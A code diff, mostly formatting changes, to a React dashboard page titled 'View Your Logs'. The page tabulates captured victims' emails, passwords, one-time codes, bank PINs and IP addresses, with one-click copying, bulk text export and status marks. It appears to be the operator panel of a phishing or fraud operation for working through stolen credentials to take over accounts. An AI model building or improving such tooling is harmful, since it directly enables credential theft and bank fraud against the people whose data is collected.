@@ -4,7 +4,7 @@ import React, { Fragment, useEffect, useState } from "react";
 import { Button, Card, Col, Pagination, Row } from "react-bootstrap";
 import { deleteAccounts, getAccounts } from "@/shared/Api/dashboard";
 import { useDispatch, useSelector } from "react-redux";
-import { X, Check, Lock, RotateCcw } from 'lucide-react';
+import { X, Check, Lock, RotateCcw } from "lucide-react";
 import { FaTrash } from "react-icons/fa";
 import moment from "moment";
 import Success from "@/components/SuccessPop";
@@ -25,47 +25,58 @@ function CallLogsPage() {
   const [open, setOpen] = useState(false);
   useEffect(() => {
     fetchAccounts(currentPage);
-    const storedCompletedAccounts = localStorage.getItem('completedAccounts');
+    const storedCompletedAccounts = localStorage.getItem("completedAccounts");
     if (storedCompletedAccounts) {
       setCompletedAccounts(JSON.parse(storedCompletedAccounts));
     }
-    const storedInCompleteAccounts = localStorage.getItem('inCompleteAccounts');
+    const storedInCompleteAccounts = localStorage.getItem("inCompleteAccounts");
     if (storedInCompleteAccounts) {
       setInCompleteAccounts(JSON.parse(storedInCompleteAccounts));
     }
-    const storedLocked = localStorage.getItem('locked');
+    const storedLocked = localStorage.getItem("locked");
     if (storedLocked) {
       setLocked(JSON.parse(storedLocked));
     }
   }, [currentPage]);
 
-
   const handleCompleted = () => {
-    const updatedCompletedAccounts = [...completedAccounts, ...selectedAccounts];
+    const updatedCompletedAccounts = [
+      ...completedAccounts,
+      ...selectedAccounts,
+    ];
     setCompletedAccounts(updatedCompletedAccounts);
     setSelectedAccounts([]);
-    localStorage.setItem('completedAccounts', JSON.stringify(updatedCompletedAccounts));
+    localStorage.setItem(
+      "completedAccounts",
+      JSON.stringify(updatedCompletedAccounts)
+    );
   };
   const handleInComplete = () => {
-    const updatedInCompleteAccounts = [...inCompleteAccounts, ...selectedAccounts];
+    const updatedInCompleteAccounts = [
+      ...inCompleteAccounts,
+      ...selectedAccounts,
+    ];
     setInCompleteAccounts(updatedInCompleteAccounts);
     setSelectedAccounts([]);
-    localStorage.setItem('inCompleteAccounts', JSON.stringify(updatedInCompleteAccounts));
+    localStorage.setItem(
+      "inCompleteAccounts",
+      JSON.stringify(updatedInCompleteAccounts)
+    );
   };
   const handleLocked = () => {
     const updatedLocked = [...locked, ...selectedAccounts];
     setLocked(updatedLocked);
     setSelectedAccounts([]);
-    localStorage.setItem('locked', JSON.stringify(updatedLocked));
+    localStorage.setItem("locked", JSON.stringify(updatedLocked));
   };
 
   const handleReset = () => {
     setCompletedAccounts([]);
     setInCompleteAccounts([]);
     setLocked([]);
-    localStorage.removeItem('completedAccounts');
-    localStorage.removeItem('inCompleteAccounts');
-    localStorage.removeItem('locked');
+    localStorage.removeItem("completedAccounts");
+    localStorage.removeItem("inCompleteAccounts");
+    localStorage.removeItem("locked");
   };
 
   const fetchAccounts = async (page: number) => {
@@ -159,20 +170,16 @@ function CallLogsPage() {
       )
       .join("\n");
 
-
     const fileContent = headers + textContent;
-
 
     const blob = new Blob([fileContent], { type: "text/plain;charset=utf-8;" });
     const link = document.createElement("a");
-
 
     const url = URL.createObjectURL(blob);
     link.href = url;
     link.setAttribute("download", filename);
     document.body.appendChild(link);
     link.click();
-
 
     document.body.removeChild(link);
     URL.revokeObjectURL(url);
@@ -188,227 +195,221 @@ function CallLogsPage() {
       />
       <Row>
         <Col xl={12}>
-          {accounts?.length ? (
-            <Card className="custom-card">
-              <Card.Header className="justify-content-between">
-                <Card.Title>View Your Logs</Card.Title>
-                <div className="d-flex flex-wrap gap-2">
-                  <div className="flex justify-between gap-2">
-                    <input
-                      className="form-control form-control-sm"
-                      type="text"
-                      placeholder="Search Here"
-                      aria-label=".form-control-sm example"
-                    />
-                    <div title="Reset">
+          <Card className="custom-card">
+            <Card.Header className="justify-content-between">
+              <Card.Title>View Your Logs</Card.Title>
+              <div className="d-flex flex-wrap gap-2">
+                <div className="flex justify-between gap-2">
+                  <input
+                    className="form-control form-control-sm"
+                    type="text"
+                    placeholder="Search Here"
+                    aria-label=".form-control-sm example"
+                  />
+                  <div title="Reset">
                     <Button
                       className="btn-lg bg-[#546dfe]"
                       onClick={handleReset}
                     >
-                      <RotateCcw  size={14} />
+                      <RotateCcw size={14} />
                     </Button>
                   </div>
-                    <div title="Mark selected as locked">
-                      <Button
-                        className="bg-[#546dfe] btn-lg"
-                        onClick={handleLocked}
-                        disabled={selectedAccounts.length === 0}
-                      >
-                        <Lock size={14} className="hover:text-green-400" />
-                      </Button>
-                    </div>
-                    <div title="Mark selected as Incomplete">
-                      <Button
-                        className="bg-[#546dfe] btn-lg"
-                        onClick={handleInComplete}
-                        disabled={selectedAccounts.length === 0}
-                      >
-                        <X size={14} className="hover:text-red-400" />
-                      </Button>
-                    </div>
-                    <div title="Mark selected as completed">
-                      <Button
-                        className="bg-[#546dfe] btn-lg"
-                        onClick={handleCompleted}
-                        disabled={selectedAccounts.length === 0}
-                      >
-                        <Check size={14} className="hover:text-green-400" />
-                      </Button>
-                    </div>
-                    <div
-                      title="Delete selected logs"
-                      className="hover:text-red-500"
-                    >
-                      <Button
-                        className="bg-[#546dfe] btn-lg"
-                        onClick={handleDeleteSelectedAccounts}
-                        disabled={selectedAccounts.length === 0}
-                      >
-                        <FaTrash size={14} className="hover:text-red-400" />
-                      </Button>
-                    </div>
-
+                  <div title="Mark selected as locked">
                     <Button
-                      className="bg-[#546dfe] w-[200px] text-nowrap"
-                      onClick={() => exportToTxt()}
+                      className="bg-[#546dfe] btn-lg"
+                      onClick={handleLocked}
                       disabled={selectedAccounts.length === 0}
                     >
-                      Export to text
+                      <Lock size={14} className="hover:text-green-400" />
                     </Button>
                   </div>
-                </div>
-              </Card.Header>
-              <Card.Body className="p-0">
-                <div className="table-responsive">
-                  <table className="table text-nowrap">
-                    <thead>
-                      <tr>
-                        <th>
-                          <input
-                            title="select all"
-                            className="mt-1"
-                            type="checkbox"
-                            checked={
-                              selectedAccounts?.length === accounts?.length
-                            }
-                            onChange={toggleSelectAll}
-                          />
-                        </th>
-                        <th>Email</th>
-                        <th>Password</th>
-                        <th>Otp</th>
-                        <th>Bank Pin</th>
-                        <th>Country Flag</th>
-                        <th>IP Address</th>
-                        <th>Date</th>
-                        {/* <th>Action</th> */}
-                      </tr>
-                    </thead>
-                    <tbody>
-                      {accounts?.length > 0 &&
-                        accounts.map((account: any) => (
-                          <tr key={account._id}
-                          className={`${
-                            completedAccounts.includes(account._id)
-                              ? "text-green-700" // Tailwind class for light green background
-                              : ""
-                          } ${inCompleteAccounts.includes(account._id)
-                              ? "text-red-700" // Tailwind class for light green background
-                              : ""} 
-                            ${locked.includes(account._id)
-                              ? "text-purple-700" // Tailwind class for light green background
-                              : ""
-                            }`} 
-                          >
-                            <td>
-                              <input
-                                type="checkbox"
-                                checked={selectedAccounts.includes(account._id)}
-                                onChange={() =>
-                                  toggleSelectAccount(account._id, account)
-                                }
-                              />
-                            </td>
-                            <td>
-                              <div className="d-flex">
-                                <div
-                                  className="ms-2"
-                                  onClick={() => copyToClipboard(account.email)}
-                                >
-                                  <p className="fs-12 mb-0">
-                                    {account.email}
-                                  </p>
-                                </div>
-                              </div>
-                            </td>
-                            <td
-                              onClick={() => copyToClipboard(account.password)}
-                            >
-                              {account.password}
-                            </td>
-                            <td onClick={() => copyToClipboard(account.otp)}>
-                              <span
-                                className={`bg-${account?.status?.toLowerCase()}-transparent`}
-                              >
-                                {account.otp}
-                              </span>
-                            </td>
-                            <td
-                              onClick={() => copyToClipboard(account.bankPin)}
-                            >
-                              <span className="fw-semibold fs-13">
-                                {account.bankPin}
-                              </span>
-                            </td>
-                            <td>
-                              <img
-                                src={`https://flagcdn.com/16x12/${account?.location?.countryCode.toLowerCase()}.png`}
-                                alt={account?.location?.country}
-                                width="16"
-                                height="12"
-                                title={`${account?.location?.country}, ${account?.location?.city}`}
-                              />
-                            </td>
-                            <td
-                              onClick={() =>
-                                copyToClipboard(account?.location?.ipAddress)
-                              }
-                            >
-                              {account?.location?.ipAddress}
-                            </td>
-                            <td>
-                            {moment(account?.createdAt).format("ddd, MMM DD, YYYY, hh:mm A")}
-                            </td>
-                          </tr>
-                        ))}
-                    </tbody>
-                  </table>
-                </div>
-              </Card.Body>
-              <Card.Footer>
-                <div className="d-flex align-items-center">
-                  <div>
-                    Showing {totalAccounts} Entries{" "}
-                    <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
-                  </div>
-                  <div className="ms-auto">
-                    <nav
-                      aria-label="Page navigation"
-                      className="pagination-style-4"
+                  <div title="Mark selected as Incomplete">
+                    <Button
+                      className="bg-[#546dfe] btn-lg"
+                      onClick={handleInComplete}
+                      disabled={selectedAccounts.length === 0}
                     >
-                      <Pagination className="pagination mb-0">
-                        <Pagination.Item
-                          disabled={currentPage === 1}
-                          onClick={() => handlePageChange(currentPage - 1)}
-                        >
-                          Prev
-                        </Pagination.Item>
-                        {[...Array(totalPages)].map((_, index) => (
-                          <Pagination.Item
-                            key={index}
-                            active={index + 1 === currentPage}
-                            onClick={() => handlePageChange(index + 1)}
-                          >
-                            {index + 1}
-                          </Pagination.Item>
-                        ))}
-                        <Pagination.Item
-                          disabled={currentPage === totalPages}
-                          onClick={() => handlePageChange(currentPage + 1)}
-                        >
-                          Next
-                        </Pagination.Item>
-                      </Pagination>
-                    </nav>
+                      <X size={14} className="hover:text-red-400" />
+                    </Button>
                   </div>
+                  <div title="Mark selected as completed">
+                    <Button
+                      className="bg-[#546dfe] btn-lg"
+                      onClick={handleCompleted}
+                      disabled={selectedAccounts.length === 0}
+                    >
+                      <Check size={14} className="hover:text-green-400" />
+                    </Button>
+                  </div>
+                  <div
+                    title="Delete selected logs"
+                    className="hover:text-red-500"
+                  >
+                    <Button
+                      className="bg-[#546dfe] btn-lg"
+                      onClick={handleDeleteSelectedAccounts}
+                      disabled={selectedAccounts.length === 0}
+                    >
+                      <FaTrash size={14} className="hover:text-red-400" />
+                    </Button>
+                  </div>
+
+                  <Button
+                    className="bg-[#546dfe] w-[200px] text-nowrap"
+                    onClick={() => exportToTxt()}
+                    disabled={selectedAccounts.length === 0}
+                  >
+                    Export to text
+                  </Button>
                 </div>
-              </Card.Footer>
-            </Card>
-          ) : (
-            <div className="text-center h-[500px] flex items-center justify-center self-center">
-              No Call Log Found
-            </div>
-          )}
+              </div>
+            </Card.Header>
+            <Card.Body className="p-0">
+              <div className="table-responsive">
+                <table className="table text-nowrap">
+                  <thead>
+                    <tr>
+                      <th>
+                        <input
+                          title="select all"
+                          className="mt-1"
+                          type="checkbox"
+                          checked={
+                            selectedAccounts?.length === accounts?.length
+                          }
+                          onChange={toggleSelectAll}
+                        />
+                      </th>
+                      <th>Email</th>
+                      <th>Password</th>
+                      <th>Otp</th>
+                      <th>Bank Pin</th>
+                      <th>Country Flag</th>
+                      <th>IP Address</th>
+                      <th>Date</th>
+                      {/* <th>Action</th> */}
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {/* {accounts?.length > 0 && */}
+                    {accounts.map((account: any) => (
+                      <tr
+                        key={account._id}
+                        className={`${
+                          completedAccounts.includes(account._id)
+                            ? "text-green-700" // Tailwind class for light green background
+                            : ""
+                        } ${
+                          inCompleteAccounts.includes(account._id)
+                            ? "text-red-700" // Tailwind class for light green background
+                            : ""
+                        } 
+                            ${
+                              locked.includes(account._id)
+                                ? "text-purple-700" // Tailwind class for light green background
+                                : ""
+                            }`}
+                      >
+                        <td>
+                          <input
+                            type="checkbox"
+                            checked={selectedAccounts.includes(account._id)}
+                            onChange={() =>
+                              toggleSelectAccount(account._id, account)
+                            }
+                          />
+                        </td>
+                        <td>
+                          <div className="d-flex">
+                            <div
+                              className="ms-2"
+                              onClick={() => copyToClipboard(account.email)}
+                            >
+                              <p className="fs-12 mb-0">{account.email}</p>
+                            </div>
+                          </div>
+                        </td>
+                        <td onClick={() => copyToClipboard(account.password)}>
+                          {account.password}
+                        </td>
+                        <td onClick={() => copyToClipboard(account.otp)}>
+                          <span
+                            className={`bg-${account?.status?.toLowerCase()}-transparent`}
+                          >
+                            {account.otp}
+                          </span>
+                        </td>
+                        <td onClick={() => copyToClipboard(account.bankPin)}>
+                          <span className="fw-semibold fs-13">
+                            {account.bankPin}
+                          </span>
+                        </td>
+                        <td>
+                          <img
+                            src={`https://flagcdn.com/16x12/${account?.location?.countryCode.toLowerCase()}.png`}
+                            alt={account?.location?.country}
+                            width="16"
+                            height="12"
+                            title={`${account?.location?.country}, ${account?.location?.city}`}
+                          />
+                        </td>
+                        <td
+                          onClick={() =>
+                            copyToClipboard(account?.location?.ipAddress)
+                          }
+                        >
+                          {account?.location?.ipAddress}
+                        </td>
+                        <td>
+                          {moment(account?.createdAt).format(
+                            "ddd, MMM DD, YYYY, hh:mm A"
+                          )}
+                        </td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+            </Card.Body>
+            <Card.Footer>
+              <div className="d-flex align-items-center">
+                <div>
+                  Showing {totalAccounts} Entries{" "}
+                  <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
+                </div>
+                <div className="ms-auto">
+                  <nav
+                    aria-label="Page navigation"
+                    className="pagination-style-4"
+                  >
+                    <Pagination className="pagination mb-0">
+                      <Pagination.Item
+                        disabled={currentPage === 1}
+                        onClick={() => handlePageChange(currentPage - 1)}
+                      >
+                        Prev
+                      </Pagination.Item>
+                      {[...Array(totalPages)].map((_, index) => (
+                        <Pagination.Item
+                          key={index}
+                          active={index + 1 === currentPage}
+                          onClick={() => handlePageChange(index + 1)}
+                        >
+                          {index + 1}
+                        </Pagination.Item>
+                      ))}
+                      <Pagination.Item
+                        disabled={currentPage === totalPages}
+                        onClick={() => handlePageChange(currentPage + 1)}
+                      >
+                        Next
+                      </Pagination.Item>
+                    </Pagination>
+                  </nav>
+                </div>
+              </div>
+            </Card.Footer>
+          </Card>
         </Col>
       </Row>
     </Fragment>
